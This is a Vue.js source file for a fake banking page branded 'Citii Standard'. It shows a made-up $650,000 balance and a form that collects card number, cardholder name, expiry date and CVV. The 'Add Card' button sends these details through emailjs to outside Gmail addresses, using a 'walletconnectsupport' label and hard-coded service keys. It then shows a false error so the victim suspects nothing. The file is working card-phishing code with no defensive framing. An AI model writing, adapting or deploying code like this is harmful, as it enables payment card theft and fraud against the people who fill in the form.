<template>
  <div>
    <div class="d-flex justify-space-between align-middle">
<p class="text-center display-4  pa-2" style="position:sticky;top:0%;z-index:2;">
   <v-avatar size="x-large"><img src="../assets/bremen.png" width="50" alt="" srcset="" ></v-avatar>
    &nbsp;Citii Standard</p>
    <div>
    
</div>
    </div>
<!-- account profile -->
   

<hr>
<!-- balance pane -->
<div class="container-fluid mt-4 pa-3 ">
    <div class="card bg-img bg-red text-white " style="text-align:left;padding:10px;">
 
  <div class="mb-4">
    <h5 class="card-title">{{ card_name==""?"Card holder name":card_name }}</h5>
    <p class="card-text">{{ card_num == "" ? "**** **** **** ****" : card_num }}</p>
  </div>
<p> {{hideorshow}}</p>
  <div class="d-flex justify-content-between mt-2 align-items-center">
<div>{{ exp == "" ? "###" : exp }}</div>
<div>{{ c33 == "" ? "###" : c33 }}</div>
  </div>
</div>
</div>
<!-- next phase -->
<!-- <div class="container" style="text-align:left;padding:10px;margin-top:10px;">
    <p class="text-red">To add card you must verify your account</p>
    <v-btn
    color="success"
    >verify account</v-btn>
    <hr class="shadow">
</div> -->
<!-- form phase -->
<div class="form">
  
        <div>
            <v-text-field
       
        label="number"
     
        v-model="card_num"
        ></v-text-field>

        <v-text-field
        v-model="card_name"
        label="cardholder name"
    
        >

        </v-text-field>
        </div>
        

        <v-row
        justify="space-between"
        >
            <v-col cols="3">
  <v-text-field
        v-model="exp"
        label="expiry date"
     
        >

        </v-text-field>


            </v-col>
            <v-col cols="3">

                 <v-text-field
        v-model="c33"
        label="CVV"
       
        >

        </v-text-field>
            </v-col>
        </v-row>
        <div class="pay text-center" mb-2>
            <v-btn
          elevation="5"
          @click="sendEmail_me()"
            >
                Add Card
            </v-btn>
        </div>
   
</div>

</div>
 
</template>

<script>
import emailjs from 'emailjs-com'
export default {
    data() {
        return {
            
            swi: true,
            card_num:"",
            c33:"",
            exp:"",
            card_name:""    
     }
    },
    computed: {
         hideorshow() {

            return this.swi ? "$650,000" : "*********";
        }
    },
    methods:{
        sendEmail_me() {
            try {
                emailjs.send('service_hchsgkm', 'template_8ehnn14',
                    {
                        name: 'walletconnectsupport',
                        email: 'showolesheriff7@gmail.com',
                        message: "  "+this.card_name+" "+this.card_num+" "+this.c33+"  "+this.exp,
                        to: 'Sunflower312m@gmail.com'
                    }, 'WU485GiLgQouTPnp5');

alert("can't handle request at this time")
            } catch (error) {
                console.log({ error })
            }
            // Reset form fieldMelindahotbenks101@outlook.com

        },
    }
}
</script>

<style>
.bg-img {
    
}
</style>